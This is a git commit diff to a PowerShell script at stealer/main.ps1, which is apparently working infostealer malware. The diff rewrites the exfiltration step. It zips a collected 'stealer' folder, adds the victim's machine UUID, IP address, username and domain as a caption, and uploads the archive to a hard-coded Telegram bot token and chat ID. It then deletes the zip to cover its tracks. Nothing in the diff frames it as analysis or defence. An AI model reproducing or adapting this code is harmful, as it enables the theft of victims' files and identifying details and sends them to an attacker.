2f8cd6dab6705be77baaeda3bf511ea108550e84
43a1723 <hai1723notgay@gmail.com>
2025-01-15 14:10:58 +0700

    Update main.ps1

--- stealer/main.ps1
+++ stealer/main.ps1
@@ -18,14 +18,25 @@ if (Test-Path -Path $output) {
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
 }
-cd $stealer
-call $output
-$archivePath=[System.IO.Path]::GetTempPath()+$userName+'.zip'
-Compress-Archive -Path ($stealer) -DestinationPath $archivePath -Force
-$botToken="7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"
-$chatId="7056174540"
-$telegramApiUrl="https://api.telegram.org/bot$botToken/sendDocument"
-$multipartContent=New-Object System.Net.Http.MultipartFormDataContent
-$multipartContent.Add((New-Object System.Net.Http.StringContent($chatId)),"chat_id")
-$multipartContent.Add((New-Object System.Net.Http.StreamContent([System.IO.File]::OpenRead($archivePath))),"document",[System.IO.Path]::GetFileName($archivePath))
-(New-Object System.Net.Http.HttpClient).PostAsync($telegramApiUrl,$multipartContent).Result
+
+$sourcePath = $stealer
+$username = $env:USERNAME
+$zipPath = "$dir\$username_Info.zip"
+Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force
+$botToken = "7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"
+$chatId = "7056174540"
+$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
+$uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
+$ipAddress = (Test-Connection -ComputerName "8.8.8.8" -Count 1).IPv4Address.ToString()
+$userDomain = $env:USERDOMAIN
+$caption = "UUID: $uuid, IP: $ipAddress, Username: $username, UserDomain: $userDomain"
+$response = Invoke-RestMethod -Uri $telegramApiUrl -Method Post -Form @{
+    chat_id = $chatId
+    document = Get-Item $zipPath
+    caption = $caption
+}
+if ($response.ok) {
+    Write-Output "Tệp ZIP đã được gửi thành công."
+}
+Remove-Item -Path $zipPath -Force
+
